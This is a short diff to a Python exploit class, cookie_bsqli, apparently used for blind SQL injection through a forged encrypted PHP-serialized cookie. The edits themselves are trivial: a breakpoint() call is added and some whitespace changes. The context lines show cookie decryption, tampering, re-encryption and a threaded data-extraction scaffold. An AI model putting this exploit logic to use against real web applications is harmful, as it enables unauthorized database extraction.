@@ -62,7 +62,7 @@ class cookie_bsqli:
 		self.url = BASE_URL
 		self.session = requests.session()
 		self.aes = Aes(self.__get_key())
-		self.cookie_dict, self.cookie_id = self.__decode_cookie()
+		self.cookie_dict, self.cookie_id = self.__decode_cookie();breakpoint()
 		self.deserialized_data = self.__decrypt_value()
 		self.exfil_data = {}
 		self.thrds = []
@@ -116,12 +116,11 @@ class cookie_bsqli:
 		serialized_data = phpserialize.dumps(self.deserialized_data)
 		new_data = {'data':serialized_data.decode(), 'expires':int(time.time()+60*60)}
 		json_nval = json.dumps(new_data).encode()
-
+  
 		# Encrypt the injected data object contained in the target cookie
 		encrypted_nval = self.aes.encrypt(json_nval)
 		cookie_payload = self.__encode_value(encrypted_nval)
 		return b64encode(cookie_payload).decode()
-
 	def __check_status(self, status_code, pos, ch):
 		if status_code == 200 and ch:
 			if type(ch) == int:
